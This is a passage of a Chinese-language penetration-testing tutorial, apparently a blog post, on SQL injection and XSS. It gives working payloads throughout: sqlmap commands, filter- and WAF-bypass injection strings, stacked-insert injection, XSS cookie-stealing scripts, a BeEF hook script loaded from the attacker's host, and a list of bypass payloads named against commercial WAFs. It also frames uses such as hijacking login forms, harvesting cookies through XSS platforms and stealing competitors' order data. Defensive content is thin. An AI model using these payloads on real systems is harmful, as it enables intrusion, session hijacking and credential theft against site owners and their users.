sqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密
sqlmap -u URL --current-db
sqlmap -u URL --current-user
```

你可以点击以下文章以便了解更多使用
[这篇热门文章对sqlmap做了详细的解释](https://www.freebuf.com/sectool/164608.html)
[sqlmap使用简要版](https://blog.csdn.net/weixin_43729943/article/details/104169193)
sqlmap tamper使用
**sql其他注入工具**
sqlmap
Pangolin
Havij
**防止SQL注入**
严格验证数据类型、长度和合法的取值范围
特殊字符转义

**经验**
前辈经验发现：sql注入还可能存在注册中输入号码部分；

#### tamper 自定义

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708185301610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708185420237.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708190916943.png)
sqlmap在请求中，应该
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708193025566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708194820899.png)
#### 注入插件脚本编写
新建一个发送数据包的txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708205251356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
用sqlmap参数-r执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708205302204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 跨域连接

也只有是root权限你才可以去查询数据库名即show schemata ，而前面的show databases()查询的是当前数据库，这不满足我们的需求
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180515958.png)

### 文件读取与写入

**读取**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181705882.png)
具体搜索关键字 常见load_file读取敏感信息.
这里要想使用得好这个函数，你需要结合我前面写的‘路径读取’来达到效果

**写入**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705183450890.png)

写入需要结合前文所描述的后门怎么制作达到最好效果。




### SQL注入常见防御

1. url/?id=MQ== 类似于这样的链接，这样的链接是经过base64编码的，因此你在测试这个网站有没有注入点时，你需要先将id进行解码，然后合并你的注入语句比如id=1 and 1=2 一起经过同等类型的编码；当然也有不少网站为了安全采用了自己的加密算法，这时候你也许就不能找到漏洞了。


**magic_quotes_gps，addslashes**
这种方法很好绕过，用hex进行编码后就可以
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705184351390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705184435881.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070518451262.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705185955596.png)
**判断类型**
这种方法更常见，目前很难被绕过，有人说可以溢出绕过，或者试试2进制，我后续多查查资料再补充一下。![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070519112684.png)
一个网站的防注入通常都是全局配置的，有的参数是应该被允许用字符型的。如果一个个写这种特定过滤会使得代码不美观，有的程序员会因此放弃这种好的写法。但一些点对点红蓝攻击多数会使用这种办法。

**关键字过滤**
比如过滤大小写、select等

**防护软件**

### 绕过防御

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705211048981.png)

#### IP白名单
通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。
从网络层获取的ip，这种一般伪造不来，因为：1.你需要获取白名单ip 2.ip判定是从请求数据包进行判定的，这样就有可能存在伪造ip绕过的情况。
测试方法：修改http的header来by pass waf
X-forwarded-for
X-remote-IP
X-remote-addr
X-Real-IP
#### 静态资源
特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求，因为Waf认为一般图片和文本格式或其他静态脚本都是无害的。
老版本WAF可以这么绕过，现在的不行了
http://10.9.9.201/sql.php?id=1
http://10.9.9.201/sql.php/1.txt?id=1
备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。
#### 爬虫白名单
部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：
1.根据UserAgent 
2.通过行为来判断
UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。这种技术用在ip被封锁，或者频繁扫描请求中
User Agent Switcher (firefox 附加组件)，下载地址：
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/
伪造成百度爬虫
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708170647879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
#### 版本绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172007570.png)
union 和select 放一起就会被墙，用以下方法就是安全的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172342231.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172930538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 空白

我们可以用来尝试逃避签名检测的第一种方法是利用空白。添加额外的空格或特殊字符（如制表符或换行符）不会影响 SQL 语句，但可能会通过过滤器获取恶意负载。制表符或换行符也不会影响语句

#### 空字节

通常，过滤器会阻止某些字符在 SQL 语句中执行。这可能是阻止攻击的最常见方式，因为如果没有撇号或破折号等特殊字符，注入不太可能成功。

解决此问题的一种方法是在任何被阻止的字符前使用空字节(%00)。例如，如果我们知道应用程序正在阻止撇号，则可以使用以下注入来欺骗过滤器以允许它们：

```bash
%00' or 1=1--
```

#### 网址编码

另一种避免检测的方法是使用 URL 编码。这种类型的编码用于通过 HTTP 通过 Internet发送Web 地址信息。由于 URL 只能包含 ASCII 值，因此任何无效字符都需要编码为有效的 ASCII 字符。URL 也不能包含空格，因此它们通常被转换为 + 号或 %20。通过使用 URL 编码屏蔽恶意 SQL 查询，可以绕过过滤器。以下面的注入为例：

```bash
' or 1=1--
```

使用 URL 编码，它看起来像：

```bash
%27%20or%201%3D1--

```

#### 十六进制编码（HEX）

有助于逃避检测。例如：

```bash
SELECT * FROM Users WHERE name='admin'--
```

十六进制编码的等效项将是：

```bash
SELECT * FROM Users WHERE name=61646D696E--
```

或者，我们可以使用 UNHEX() 函数来实现相同的结果：

```bash
SELECT * FROM Users WHERE name=UNHEX('61646D696E')--

```

#### 字符编码

字符编码的工作方式与十六进制编码类似，因为原始 SQL 语句中的字符被替换为转换后的值。这种类型的编码使用 CHAR() 函数将字符编码为十进制值。
看看下面的查询：

```bash
SELECT * FROM Users WHERE name='admin'--
```

```bash
SELECT * FROM Users WHERE name=CHAR(97,100,109,105,110)--

```

#### 字符串连接

另一种用于绕过过滤器的方法是字符串连接。我们在之前的教程中介绍了字符串连接，但这里也可以应用相同的概念；我们通常可以通过分解恶意 SQL 查询中的关键字来避免检测。请记住，不同的数据库系统之间的字符串连接会有所不同。让我们看看下面的语句：

```bash
SELECT * FROM Users WHERE id=1
```

mysql

```bash
CONCAT('SEL', 'ECT') * FROM Users WHERE id=1

```

PostgreSQL：

```bash
'SEL' || 'ECT' * FROM Users WHERE id=1

```

甲骨文（两个选项）：

```bash
CONCAT('SEL', 'ECT') * FROM Users WHERE id=1

```

```bash
'SEL' || 'ECT' * FROM Users WHERE id=1

```

#### 注释

滥用 SQL 处理内联注释的方式还有助于在执行 SQL 注入攻击时绕过过滤器并避免检测。由于语句中可以有任意数量的注释并且仍然有效，我们可以使用它们来分解查询并可能绕过任何存在的过滤器。例如，我们可以在关键字之间插入注释，如下所示：

```bash
SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--

```

#### 组合

有时，即使是这些签名规避技术本身也不会成功，但我们可以将它们结合起来，以进一步提高我们成功绕过防御并完成攻击的机会。例如，假设我们正在攻击的应用程序上的过滤器不允许使用注释字符。为了解决这个问题，我们可以尝试制作一个对这些字符进行编码的查询，以欺骗过滤器允许它们。失败的原始查询：

```bash
SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--

```

使用 URL 编码屏蔽注释字符的相同查询：

```bash
SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2FUsers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fname%2F%2A%2A%2F%3D%2F%2A%2A%2F%E2%80%99admin%E2%80%99--

```


#### 二次注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707121240712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

我们可以用来帮助逃避签名的最后一种方法有点复杂，但是根据数据库的配置方式，当其他所有方法都失败时，这种类型的攻击可能会有所帮助。
指已存储（数据库、文件）读取后再次进入到SQL查询语句中导致的注入
当我们创建一个帐户时，SQL 查询可能如下所示：

```bash
INSERT INTO Users (username, password) VALUES ('johndoe''', 'hunter2')

```

这不会对数据库造成任何问题，因为一旦单引号被加倍，它仍然是一个有效的语句。现在假设我们想更改密码。发送到数据库的查询如下所示：

```bash
SELECT password FROM Users WHERE username='johndoe''

```

由于存储在数据库中的用户名值是字符串“johndoe”，因此现在存在 SQL 注入缺陷，因为不再过滤原始输入。为了利用这一点，我们所要做的就是注册一个包含恶意代码的用户名，例如：

```bash
UNION ALL SELECT * FROM Users WHERE username='admin'--

```

帐户创建本身将被成功处理，但是当我们更改密码时，将执行恶意查询，从而绕过输入验证。

**与普通SQL注入的异同点**

二次注入危害与sql注入相同，但二次注入要更加的隐蔽。他的穿在数量要远小于直接性的SQL注入



**如何发现二次注入**

没有工具，这种漏洞具有一点逻辑层面的感觉。直接用扫描器扫不出来的，基本只能靠人力。
**实例**
注册新用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122604565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122623934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
登录进行修改密码界面，把原始密码123456修改成xxxxxx
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125422301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
修改完成，查看数据库，修改密码的账号为dhakkan
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070712550637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
查看源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125644184.png)

### 注入拓展

#### dnslog带外注入

这个漏洞需要注入的目标是需要当前注入用户拥有最高权限，且有权限进行读写操作。你可能疑惑这个能读写了难道后门不就随便写吗。事实上这个方法是用在你无法写入后门时..解决了盲注不能回显数据，效率低的问题。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133513883.png)
使用方法就是执行下面语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133521556.png)
其中上面ek0j...是来源于下面这个网站
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133527305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
诸如演示脚本演示
工具：https://github.com/ADOOO/DnslogSqlinj
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707140410167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707140435658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070714044817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### json格式数据包

有的网站对语句使用json格式传输
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111016493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

这在APP中登录或者上传却很常见.这种注入应该将语句写入json中，如图对a进行注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706110730264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### insert 注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001251209.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001309195.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001523973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
#### 加密参数
要想自动化测试，就需要对输入的参数进行编码。这里进行了文件中转。再用sqlmap调用这个函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707210151862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707210416830.png)
####  堆叠查询注入
Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。
下图展示了堆叠的sql语句是什么样的以及执行结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211416398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎的不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些数据。比如mysql支持堆叠写法，但是redis等其他数据库是不支持这种写法的

实例：堆叠注入(多语句)

```bash
http://127.0.0.1/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211527463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211534991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
堆叠注入用处：注入需要管理员账号密码，密码是加密，无法解密，使用堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。
mtype:会员类别
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211556997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### cookie 注入

sqlmap -u "http://www.xx.com/xxx.asp" --cookie "id=XXX cookie" --level 2 ＼
cookie注入 后接cookie值
当网站依靠cookie结果做数据库查询，且不做过多的防护就会存在注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)

## xss攻击
xss攻击执行的是javascript脚本，javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击。比如对你的用户名展示，对你输入的东西展示。

Cookie 窃取XSS 。诱导用户去点击你含有cookie切入的链接，比如你可以将自己用户名改`<script>alert(document.cookie)</script>`  向用户去求分享链接，比如百度网盘之前一漏洞：有人用户名为此，当别人给他账号分享文件时，就会弹出此用户的cookie。
虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。


**常见问题：cookie获取到了缺登录不上？**
区别两个术语
cookie 储存本地 存活时间较长 小中型
session 会话 存储服务器 存活时间较短  大型。session就像比如你登录了一次支付宝，过了几分钟不用就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。
对方网站如果只认cookie验证，那么你盗取session是没什么价值的。反过来只认session你盗取cookie做验证也是没有价值的
**常见问题：这个地方是因为有什么防护机制我的xss没有执行？**
查看输入浏览器的位置就可以知道
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710170454262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**常见问题：cookie是空？**
这种一般是http-only打开了

****
**技巧：利用cookie的工具**
你盗取到的cookie可以直接用postman进行访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710115739542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**技巧：从phpinfo返回信息获得管理权限**
phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710150205547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 反射型

```python
url/?name=<script>alert(document.cookie)</script>
```

**xss脚本**

```bash
<img src=1 onerror=alert(1);>
#当管理员对>进行转义时，你可以采用onclick
' onclick="alert(2)"
#过滤了on,但是这种写法要点击不像script直接跳转
a href='javascript:alert(1)'

```

#### 持久型
数据写在了服务器中
**玩法: 盗取竞争对手订单**
去竞争对手网站购买东西，填写订单信息如电话号码等时导入对方的cookie
#### DOM型
写过前端界面的人都能很好理解什么是DOM型，即用户进行某种操作如点击onclick关联了前端脚本函数。这种漏洞你可以看到源码，而前两种不可以
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520191509433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



ign()这些方法通过Javascript实现跳转。我们第一时间可能想到的是限制不严导致任意URL跳转漏洞，而DOM XSS与此似乎“八竿子打不着”，实际上跳转部分参数可控，可能导致Dom xss。

首先我们来看个简单的例子:

var hash = location.hash;
if(hash){
    var url = hash.substring(1);
    location.href = url;
}
那么可以使用伪协议#javascript:alert(1)。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520190651246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)







强制下载文件
重定向用户
其他脚本以启用键盘记录器，拍照等
网络钓鱼、窃取用户Cookies、弹广告刷流量、具备改页面信息、删除文章、获取客户端信息、传播蠕虫


csp没如何绕过，dom型xss和反射型xss区别，xss获取cookie如何绕过http-only等一些。

xss漏洞原理分析与挖掘方法 - 知乎
web漏洞 | XSS（跨站攻击脚本）详解
XSS汇总
XSS小结 - 先知社区
2020跨站点脚本[xss]速查表|雨苁
XSSer自动化工具
XSStrike 自动化绕过WAF
xss payload字典 burp爆破　
客服对话系统上XSS打cookie
搭建XSS平台 3s.wf/
http://xssor.io

### 待补充：fuzz
### XSStrike
https://github.com/s0md3v/XSStrike
外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。

 - XSStrike主要特点反射和DOM XSS扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的JS库扫描
   只能payload生成器 手工制作的HTML&JavaScript解析器 强大的fuzzing引擎 盲打XSS支持 高效的工作流
   完整的HTTP支持 Bruteforce payloads支持 Payload编码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710223335774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### xss平台
如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个。目前国内几款xss平台使用规则都差不多，通常总有延迟等问题，不是很好用
自己写类似于如下，一个文件用于触发，另一个文件用于接收。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710003925868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710004151205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 使用

以下为链接为  https://xsshs.cn 的平台，其他XSS平台使用类似
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221344762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
一般选默认，默认是获取cookie。也不要太多模块都勾选，非常非常容易导致JS报错，如果报错，那么可能你就收不到对方的中招信息了。尽量只勾选一个或两个。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221517840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
最后XSS平台就会告诉你怎么样执行代码了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221902641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
图片XSS 获取对方后台 使用讲解    https://woj.app/1785.html

**盗取账号密码**

XSS 之 form表单劫持(通用明文记录)    https://woj.app/1684.html (这里推荐使用平台最新表单劫持插件，无需设置，直接可用)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710164541523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
保存读取：通过读取保存他的数据
没保存读取：表单劫持(登录框
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071016590266.png)



xss获取后台二级密码 – URL跳转 (地址栏不变)    https://woj.app/1820.html

后台(内网)打穿神器→xss蠕虫    https://woj.app/2173.html

xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html

不用cookie 一个储存XSS对“某btc平台”攻城略地  https://woj.app/3035.html
### XSS其他工具推荐
https://xssfuzzer.com/fuzzer.html
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710215938334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### beef-xss

打开kali，执行`beef-xss`
命令行启动之后，开启beef终端。默认帐号密码是：beef/beef
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071013163322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
这时候啥都干不了，是因为你有一步很重要的操作没做。这里需要把payload复制粘贴到你的目标xss的位置，然后将其中的<IP>改成你这台kali的IP地址，最终payload为：<script src="http://X.X.X.X:3000/hook.js"></script>
改完之后，会发现online browers中多了点东西，这时候就可以开始操作了

beef还是很强大的，入侵成功后可以对对方页面进行跳转或者一些社工
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710132101331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


使用方法就是使用XSS攻击能在页面中插入类似下面的语句就可以了。

```bash
<script src="http://127.0.0.1:3000/hook.js"></script>
```

### self-xss

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052014082162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 防御与绕过
#### httponly
管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度。但是比如alert等该弹出来的还是会出来的


#### 常见防御
开启httponly，输入过滤，输出过滤等
PHP：http://www.zuimoge.com/212.html
JAVA：https://www.cnblogs.com/baixiansheng/p/9001522.html

>我见过一个挺恶心的WAF,微软这个。一旦<后面跟任何字母都算是危险操作 
>过滤 </xxx> 组合


#### 常见绕过

```bash
详细看 [翻译]绕过XSS检测机制  https://bbs.pediy.com/thread-250852.htm

Name: Cloudflare\
Payload: <a"/onclick=(confirm)()>click\
Bypass Technique: 无空格 filler

 
Name: Wordfence\
Payload: <a/href=javascript&colon;alert()>click\
Bypass Technique: 数字符编码

 
Name: Barracuda\
Payload: <a/href=&#74;ava%0a%0d%09script&colon;alert()>click\
Bypass Technique: 数字符编码

 
Name: Akamai\
Payload: <d3v/onauxclick=[2].some(confirm)>click\
Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用

 
Name: Comodo\
Payload: <d3v/onauxclick=(((confirm)))``>click\
Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用

 
Name: F5\
Payload: <d3v/onmouseleave=[2].some(confirm)>click\
Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用

 
Name: ModSecurity\
Payload: <details/open/ontoggle=alert()>\
Bypass Technique: 使用黑名单中缺少的tag（也缺少event handler？）

 
Name: dotdefender\
Payload: <details/open/ontoggle=(confirm)()//\
Bypass Technique: 使用黑名单中缺少的tag；混淆函数调用；备用标签结束
```

尝试脚本大写
多个script嵌套
用img标签
eval转换
unicode网络编码



宽字节XSS与宽字节SQL注入的不同在于宽字节注入主要是通过

吃掉转义符再正常注入SQL语句，而宽字节XSS主要使用吃掉转义符后注入恶意xss代码。

案例1：

一般情况下，当我们发现一个输入框，想要插入xss代码在里面：

<input type="text" id="name" value=""/>
通常做法是通过闭合前面的双引号和注释掉后面的双引号来触发

" /><script>alert(1)</script>//
但是开发人员一般为了防范我们在其中插入恶意代码，会在显示之前使用过滤器对我们的输入进行转义，我们闭合使用的"被转义为\",这样就导致我们没法闭合。

 

如果使用了GBK等编码，我们就可以利用宽字节xss。构造如下payload：

%c0%22 /><script>alert(1)</script>//
%c0和%df一样，也是超出了GBK的范围，此时在执行过滤操作时，源代码就变成了

<input type="text" id="name" value="%c0%5c%22 /><script>alert(1)</script>//">
当过滤器发现了%22，然后加入转义（%5c）,但在解析的时候碰到%c0,于是%5c与%c0合并成一个特殊字符，我们的"得以保留。

<input type="text" id="name" value="%c0%5c%22 /><script>alert(1)</script>//">


案例二：

下面是一个PHP的例子，在magic_quotes_gpc=On的情况下，如何触发XSS？

